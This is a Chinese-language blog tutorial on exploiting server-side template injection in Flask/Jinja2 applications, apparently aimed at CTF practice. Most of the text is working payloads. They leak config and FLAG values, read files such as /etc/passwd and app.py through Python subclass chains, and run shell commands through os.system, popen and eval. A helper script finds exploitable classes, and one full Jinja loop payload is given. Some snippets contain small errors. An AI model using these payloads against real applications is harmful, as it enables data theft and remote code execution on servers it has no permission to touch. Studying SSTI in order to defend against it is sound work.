# 原创
：  【SSTI模块注入】SSTI+Flask+Python（中）：漏洞利用

# 【SSTI模块注入】SSTI+Flask+Python（中）：漏洞利用

**目录**

[一、利用思路](#%E4%B8%80%E3%80%81%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF)

[二、针对性利用](#%E4%BA%8C%E3%80%81%E9%92%88%E5%AF%B9%E6%80%A7%E5%88%A9%E7%94%A8)

[2.1、获取基础信息：](#2.1%E3%80%81%E8%8E%B7%E5%8F%96%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF%EF%BC%9A)

[config:](#config%3A)

[self:](#self%3A)

[""、[]、()](#%22%22%E3%80%81%5B%5D%E3%80%81%28%29)

[更多](#%E6%9B%B4%E5%A4%9A)

[2.2、获取基类](#2.2%E3%80%81%E8%8E%B7%E5%8F%96%E5%9F%BA%E7%B1%BB)

[2.3、读写文件](#2.3%E3%80%81%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6)

[第一步：](#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A)

[第二步：](#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A)

[第三步：](#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A)

[第四步：](#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A)

[2.4、命令执行：](#2.4%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%9A)

[第一步：](#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A)

[第二步：](#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A)

[三、示例：](#%E4%B8%89%E3%80%81%E7%A4%BA%E4%BE%8B%EF%BC%9A)

[3.1、payload](#3.1%E3%80%81payload)

[第一个{%  %}](#%E7%AC%AC%E4%B8%80%E4%B8%AA%7B%25%C2%A0%20%25%7D)

[第二个{%  %}](#%E7%AC%AC%E4%BA%8C%E4%B8%AA%7B%25%C2%A0%20%25%7D)

[第三个{%  %}](#%E7%AC%AC%E4%B8%89%E4%B8%AA%7B%25%C2%A0%20%25%7D)

---


> 
<h2>一、利用思路</h2>
1、获取内置类所对应的类
__class__
2、获得object基类
__bases__
3、获取子类列表
__subclasses__()
4、在子类中寻找可利用的类（函数）


---


---


## 二、针对性利用

> 
<h3>2.1、获取基础信息：</h3>
<h4>config:</h4>
{{config}}：可以获取当前设置
<hr/>
<h4>self:</h4>
{{self}} ⇒ &lt;TemplateReference None&gt;
{{self.__dict__._TemplateReference__context.config}}
<hr/>
<h4>""、[]、()</h4>
配合__class__.__mro__[2]这样找到object类
{{[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']}}
<hr/>
<h4>更多</h4>
url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等
如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）
{{url_for.__globals__['current_app'].config.FLAG}}
{{get_flashed_messages.__globals__['current_app'].config.FLAG}}
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}


#### self:

---


#### 更多

> 
<h3>2.2、获取基类</h3>
''.__class__.__mro__[2]        #python2.7
''.__.class__.__mro__[1]        #python3.7
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]


> 
<h3>2.3、读写文件</h3>
<h4>第一步：</h4>
''.__class__
&lt;class 'str'&gt;#获取''字符串的所属对象
<hr/>
<h4>第二步：</h4>
''.__class__.__mro__
(&lt;class 'str'&gt;, &lt;class 'object'&gt;)#获取str类的父类
<hr/>
<h4>第三步：</h4>
''.__class__.__mro__[1].__subclasses__()
&lt;……&gt;#获取object类的所有子类
<hr/>
<h4>第四步：</h4>
''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()
[].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
读是read(),写是write()
类中寻找类，用数组下标获取，然执行类中函数（第41个类是file类）
<hr/>
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()　　　　
读文件read() 可改为 写文件write() 
<hr/>
python3没有file
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()}}


#### 第二步：

---


#### 第四步：

---


> 
<h3>2.4、命令执行：</h3>
<h4>第一步：</h4>
通过脚本找到包含os模块的类
<pre><code>n = 0
for i in 'str'.__class__.__mro__[1].__subclasses__():
#str处根据自己实际填
    try:
         if 'os' in i.__init__.__globals__:
             print (num,i)
         num+=1
    except:
        print ('-')
        num+=1</code></pre>
输出了编号为n的类
<hr/>
<h4>第二步：</h4>
构造paylad
''.__class__.__mro__[1].__subclasses__()[n].__init__.__globals__['os'].system('ls')#列出本级目录
''.__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.') #读取本级目录
<hr/>
下面如果有os类，直接执行命令
[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()
<hr/>
下面如果有eval，__import__等全局函数，进行执行命令
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
————————————————————<br/> [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
————————————————————<br/> [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
————————————————————<br/> [].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()


#### 第二步：

---


---


---


## 三、示例：

> 
<h3>3.1、payload</h3>
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read()}}{% endif %}{% endfor %}
<hr/>
<h4>第一个{%  %}</h4>
[].__class__#返回的是[]的类型list为列表
list.__base__#返回list的一个父类为object是所有类的基类所有类都是继承自object
object.__subclasses__()#返回object的所有子类所有继承自object的类
<hr/>
<h4>第二个{%  %}</h4>
循环遍历类寻找catch_warnings这个类进入该类
<hr/>
<h4>第三个{%  %}</h4>
c.__init__#表示c类中的init这个内置方法
__init__.__globals__['__builtins__']#返回init这个方法可以使用的类、方法、以及属性当中的__builtins__
__builtins__#表示内建方法因为这里所使用的open是一个内建方法利用open打开源码调用read读取


---


#### 第二个{%  %}
